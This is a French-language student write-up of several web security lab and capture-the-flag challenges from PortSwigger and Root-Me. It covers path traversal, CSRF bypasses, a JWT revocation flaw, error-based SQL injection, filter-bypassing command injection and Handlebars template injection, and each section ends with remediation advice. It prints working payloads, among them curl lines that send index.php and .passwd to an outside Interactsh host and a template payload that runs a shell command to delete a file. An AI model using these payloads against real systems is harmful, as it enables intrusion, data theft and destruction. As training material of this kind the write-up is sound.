# Sécurité web Challenges

## 1. File path traversal, validation of file extension with null byte bypass

### Lien:

https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

Le titre indique une faille liée au null byte, et le contenu montre que la vulnérabilité est aussi au niveau du chemin des images.

Donc j'intercepte le chargement des images avec Burp.

### Requête de base :

```http
GET /image?filename=38.jpg
```

En testant, je remarque que je peux modifier le paramètre filename et ajouter un path traversal.
Je tente :

```http
../../../../../../../etc/passwd%00.jpg
```

Le %00 correspond au null byte, ce qui permet de stopper la lecture réelle du nom de fichier après /etc/passwd, tout en gardant .jpg pour passer la validation.

### Payload :

```http
GET /image?filename=../../../../../../../etc/passwd%00.jpg
```

![screenshot preuve](images/chall1.png "Path traversal")

### Pour sécurisé :

- Éviter d'utiliser directement la valeur fournie par l'utilisateur dans une fonction
- Au lieu de laisser l'utilisateur choisir image.jpg, on lui donne un index
- Le serveur doit construire lui-même le chemin final.
- Faire une whitelist
- Utiliser chroot pour empêche l'application d'accéder à autre chose que son dossier.

## 3. CSRF - contournement de jeton

### Lien:

https://www.root-me.org/fr/Challenges/Web-Client/CSRF-contournement-de-jeton

Le but du challenge est d'acceder à la page private qui est seulement disponible pour un utilisateur admin, on a un formulaire profile avec un checkbox status, on suppose que si c'est check on est admin. On a un formulaire contact dont il ne filtre pas les script , alors on peut injecter un script avec le formulaire de changement de profile.


### Payload :

```
const xhr = new XMLHttpRequest();
xhr.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false); 
xhr.send(); 
const response = xhr.responseText 

const token = response.match(/[abcdef0123456789]{32}/g)[0]
<form name="e" id="profile" action="?action=profile" method="post" enctype="multipart/form-data">
			<div>
			<label>Username:</label>
			<input id="username" type="text" name="username" value="test">
			</div>
			<br>		
			<div>
			<label>Status:</label>
			<input id="status" type="checkbox" name="status" checked>
			</div>
			<br>
			<input id="token" type="hidden" name="token" value=`${token}`>
			<button type="submit">Submit</button>
</form>
document.getElementById('profile').submit()
```



![screenshot preuve](images/chall3.png "contournement de jeton")

### Pour sécurisé :
-Validation du Jeton (Côté Serveur)
-filtrer les formulaire


## 5. CSRF where Referer validation depends on header being present

### Lien:

https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present

### Aide :

https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses

Ce labo montre que la protection CSRF repose uniquement sur le header Referer.
Le serveur vérifie simplement :

- si le Referer est présent et vient du même domaine il accepte mais si le domaine est modiifer non.
- si le Referer est absent, il accepte aussi

Donc si on arrive à enlever complètement le Referer, on contourne la protection.

Selon MDN, permet de supprime le referer :
https://developer.mozilla.org/fr/docs/Web/HTTP/Reference/Headers/Referrer-Policy

```http
Referrer-Policy: no-referrer
```

Pour exploiter, il faut donc renvoyer une page HTML qui contient :

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: no-referrer
```

Puis dans le body de la réponse, un formulaire qui envoie la requete :

```html
<form
  class="login-form"
  name="change-email-form"
  action="https://0ab700b503c3052d8113390d000f002c.web-security-academy.net/my-account/change-email"
  method="POST"
>
  <input required type="email" name="email" value="tttt@test.fr" />
  <button class="button" type="submit">Update email</button>
</form>

<script>
  document.forms[0].submit();
</script>
```

![screenshot preuve](images/chall5.png "CSRF ")

### Pour sécurisé :

- Utiliser des CSRF tokens imprévisibles

- Le token doit être lié à la session utilisateur et vérifié avant l'exécution dune action sensible.

- Générer les tokens avec un CSPRNG (Cryptographically Secure Pseudo-Random Number Generator) : timestamp + secret interne + entropie système.

- Stocker le token côté serveur, dans la session.

- Vérifier que la requête entrante contient exactement le même token que celui enregistré en session.


## 6. JWT - Jeton révoqué

### Lien:

https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque

Dans l'énoncer, il nous a donné les endpoint POST : /web-serveur/ch63/login, GET : /web-serveur/ch63/admin et le code source du server, on a pu récupérer les information: de l'admin et l'algorime du système de blacklist


### Requête pour se connecter :

```
curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"admin"}' http://challenge01.root-me.org/web-serveur/ch63/login

```
### Retour de la commande:

```
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjQ3NjcxMTQsIm5iZiI6MTc2NDc2NzExNCwianRpIjoiNjE5OGI5MGMtYWQ1ZS00ODVjLTlmYTYtZWQ1NzgwM2RhMGZjIiwiZXhwIjoxNzY0NzY3Mjk0LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.fP0unthtQzz_0NV-UxQZ4AuTZMuK5jm4sSKThcftmZ8"}

```


### Requête Payload :

```
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjQ3NjcxMTQsIm5iZiI6MTc2NDc2NzExNCwianRpIjoiNjE5OGI5MGMtYWQ1ZS00ODVjLTlmYTYtZWQ1NzgwM2RhMGZjIiwiZXhwIjoxNzY0NzY3Mjk0LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.fP0unthtQzz_0NV-UxQZ4AuTZMuK5jm4sSKThcftmZ8= " http://challenge01.root-me.org/web-serveur/ch63/admin
```

![screenshot preuve](images/chall6.png "Jeton revoque")

### Pour sécurisé :

- Éviter d'utiliser un système de blacklist mieux prévilligier le whiteliste


## 7. SQL injection - Error

### Lien

https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-Error

En allant sur la page contents, j'ai vu dans l'URL qu'il y a deux paramètres :
action et order.

En testant par erreur en mettant une chaîne de caractères dans order, j'ai obtenu une erreur SQL affichée directement sur la page.

À partir de là, j'ai essayé d'envoyer ma propre requête SQL pour explorer les tables présentes dans la base.

Le serveur n'accepte d'afficher qu'une seule donnée et il faut contourner le type attendu avec un CAST().Extraction du nom de la table

### Payload :

```sql
?action=contents&order=,CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS FLOAT)
```

Résultat dans l'erreur :

```sql
ERROR: invalid input syntax for type double precision: "m3mbr35t4bl3"
```

Donc le nom de la table est m3mbr35t4bl3.

Comme les quotesne sont pas autorisées dans le paramètre order, j'ai dû reconstruire la chaîne avec CHR()

```sql
m3mbr35t4bl3 =
CHR(109)||CHR(51)||CHR(109)||CHR(98)||CHR(114)||CHR(51)||CHR(53)||CHR(116)||CHR(52)||CHR(98)||CHR(108)||CHR(51)
```

### Extraction du nom des colonnes

Deuxième colonne (la première étant l'ID)

```sql
?action=contents&order=,CAST((SELECT column_name FROM information_schema.columns WHERE table_name=CHR(109)||CHR(51)||CHR(109)||CHR(98)||CHR(114)||CHR(51)||CHR(53)||CHR(116)||CHR(52)||CHR(98)||CHR(108)||CHR(51) LIMIT 1 OFFSET 1) AS FLOAT)
```

### Erreur retournée :

```sql
ERROR: invalid input syntax for type double precision: "us3rn4m3_c0l"
```

Donc deuxième colonne : us3rn4m3_c0l

Troisième colonne

```sql

?action=contents&order=,CAST((SELECT column_name FROM information_schema.columns WHERE table_name=CHR(109)||CHR(51)||CHR(109)||CHR(98)||CHR(114)||CHR(51)||CHR(53)||CHR(116)||CHR(52)||CHR(98)||CHR(108)||CHR(51) LIMIT 1 OFFSET 2) AS FLOAT)
```

Troisième colonne retournée :

p455w0rd_c0l

### Extraction du mot de passe

Avec le nom de la table + le nom des colonnes, j'ai pu envoyer :

```sql
?action=contents&order=,CAST((SELECT p455w0rd_c0l FROM m3mbr35t4bl3 LIMIT 1) AS FLOAT)
```

Et le mot de passe apparaît dans l'erreur SQL :

![screenshot preuve](images/chall7.png "Injection SLQ")

### Pour sécurisé :

- Utiliser des requêtes préparées / paramétrées au lieu de concaténer les valeurs directement dans la requête SQL.
- Côté serveur, n'accepter que des valeurs prévues pour des paramètres
- Si on est obligé d'avoir une requête dynamique, échapper correctement les caractères spéciaux (quotes, etc.) en plus de la validation (mais ça reste secondaire par rapport aux requêtes paramétrées).
- Utiliser un ORM ou un framework (Symfony, Laravel, etc.) qui gère les requêtes préparées et évite la plupart des injections par défaut.

## 8. Injection de commande - Contournement de filtre

### Lien

https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre

En soumettant le formulaire avec Burp, on peut observer que l'application envoie l'IP directement dans un header.
En testant différents caractères, j'ai vu que certains séparateurs de lignes étaient acceptés comme %0A.

Le but du lab était de récupérer le contenu du fichier index.php, puis extraire le flag contenu dans .passwd.

Je me suis aidé de :
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection

Récupérer index.php

J'ai remarqué qu'en utilisant curl, on pouvait envoyer un fichier (en POST) vers un serveur externe (Interactsh).

### Payload :

```http
ip=127.0.0.1%0Acurl -X POST -d @index.php bflwwcoiewtvlkzyhkkukrs1vr8bc8y1f.oast.fun
```

https://curl.se/docs/manpage.html

```http
ip=127.0.0.1%0Acurl -X POST -d @index.php bflwwcoiewtvlkzyhkkukrs1vr8bc8y1f.oast.fun
```

![screenshot preuve](images/chall8-1.png "Injection commande")

### Récupérer .passwd

Dans le contenu de index.php, on voit que le serveur lit .passwd, mais ne l'affiche pas directement.
Donc il reste à exfiltrer ce fichier de la même manière.

Payload :

```http
ip=127.0.0.1%0Acurl -X POST -d @.passwd bflwwcoiewtvlkzyhkkukrs1vr8bc8y1f.oast.fun
```

![screenshot preuve](images/chall8-2.png "Injection commande")

### Pour sécurisé :

- ne pas exécuter directement une entrée utilisateur dans une commande système.
- Mettre une validation stricte côté serveur (whitelist) sur les paramètres sensibles.
- Échapper les caractères spéciaux si une commande dynamique est vraiment nécessaire.
- Utiliser un sandbox / chroot / conteneur pour limiter l'accès aux fichiers du système.
- Utiliser des bibliothèques/frameworks qui évitent les injections de commandes.

## 10. Lab: Server-side template injection in an unknown language with a documented exploit

### Lien:

https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit

La piste était de cliquer sur les produit. lorsqu'on produit n'est pas disponible l'url nous donne url /?message=Unfortunately%20this%20product%20is%20out%20of%20stock. Ici on a une entré vulnérable , on cherche sur payloadallthethings dans la mtehodologie il nous donne ${{<%[%'"}}%\. Grâce à ca on a pu derterminer que le moteur de template etait du handlebar. on cherche sur google Handlebars server-side template injection , on trouve ce script 
```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}

```
on encode_url le code puis on passe dans l'url 

![screenshot preuve](images/chall10.png "Server-side template injection")

### Pour sécurisé :
-Tests de Sécurité (Fuzzing) : Intégrer des tests automatisés qui injectent des chaînes de fuzzing (comme ${{<%[%'"}}%) dans tous les paramètres d'entrée, pour s'assurer qu'aucune erreur de compilation ou d'exécution de template n'est renvoyée.
-ne pas mettre de message d'erreur dans l'url

## 11. API - Mass Assignment

### Lien

https://www.root-me.org/fr/Challenges/Web-Serveur/API-Mass-Assignment

J'ai exploré les différents endpoints avec Burp afin de comprendre le fonctionnement de l'API.

### Création d'un compte

J'ai pu me créer un compte via :

```http
POST /api/signup HTTP/1.1
Host: challenge01.root-me.org:59090
Content-Type: application/json
Accept: application/json

{
"username": "test",
"password": "test"
}
```

Une fois logué, j'ai récupéré le cookie de session fourni par le serveur dans la réponse du login.

### Vérification de mon profil utilisateur

Requête :

```http
GET /api/user HTTP/1.1
Host: challenge01.root-me.org:59090
Content-Type: application/json
Accept: application/json
Cookie: session=...
```

Réponse :

```json
{
  "note": "",
  "status": "guest",
  "userid": 18,
  "username": "test"
}
```

Donc par défaut, je suis en statut : guest.

### Blocage sur l'endpoint /api/flag

En appelant /api/flag, l'API me répond :

```json
{ "error": "Unauthorized, user is not admin." }
```

Il faut donc être admin pour accéder au flag.

J'ai tenté un PUT sur /api/user en modifiant directement mon statut :

Payload :

```http
PUT /api/user HTTP/1.1
Host: challenge01.root-me.org:59090
Content-Type: application/json
Cookie: session=...

{
"status": "admin"
}
```

Et ça fonctionnée
![screenshot preuve](images/chall11-1.png "API Assignment")

Maintenant que mon statut est admin, j'ai pu accéder au flag :

```http
GET /api/flag
```

![screenshot preuve](images/chall11-2.png "API Assignment")

### Pour sécurisé :

- ALLOWLIST des champs modifiables
- Interdire la modification de champs sensibles (status, role, permissions)
- Ne jamais mapper automatiquement les données du client
- Contrôle d'accès avant modification
